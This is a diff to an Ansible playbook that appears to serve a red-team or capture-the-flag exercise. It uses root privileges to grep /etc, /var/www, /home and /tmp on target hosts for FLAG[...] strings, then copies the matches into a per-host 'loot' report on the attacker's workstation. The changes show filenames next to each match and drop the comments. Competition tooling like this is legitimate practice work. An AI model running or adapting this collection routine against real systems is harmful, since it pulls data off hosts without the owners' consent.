@@ -1,5 +1,4 @@
 ---
-# Pre-req: Create a local folder for the loot
 - name: Create local loot directory
   delegate_to: localhost
   file:
@@ -8,29 +7,28 @@
     mode: '0755'
   become: no
 
-# THE TARGETED HUNT: Only matches FLAG[...]
 - name: Targeted Flag Extraction
-  become: yes 
+  become: yes
   shell: |
-    grep -rEho "FLAG\[[^]]+\]" /etc /var/www /home /tmp 2>/dev/null
+    # Removed -h to show filenames. Scans common flag locations.
+    grep -rEo "FLAG\[[^]]+\]" /etc /var/www /home /tmp 2>/dev/null
   register: fs_matches
   failed_when: false
   changed_when: false
 
-# THE DELIVERY: Save to Red Workstation
 - name: Save findings to Red Team Workstation
   delegate_to: localhost
   copy:
     content: |
       === TARGETED FLAG REPORT: {{ inventory_hostname }} ===
-      
-      [MATCHES]
+      [FILE PATH : FLAG STRING]
       {{ fs_matches.stdout if fs_matches.stdout != "" else "No valid flags found." }}
     dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/flags_report.txt"
   become: no
 
-# THE LIVE FEED: Instant terminal alert
-- name: "LIVE FLAG ALERT: {{ inventory_hostname }}"
+- name: LIVE FLAG ALERT
   debug:
-    msg: "{{ fs_matches.stdout_lines }}"
+    msg: 
+      - "Location : Flag Content"
+      - "{{ fs_matches.stdout_lines | default(['No flags found']) }}"
   when: fs_matches.stdout != ""
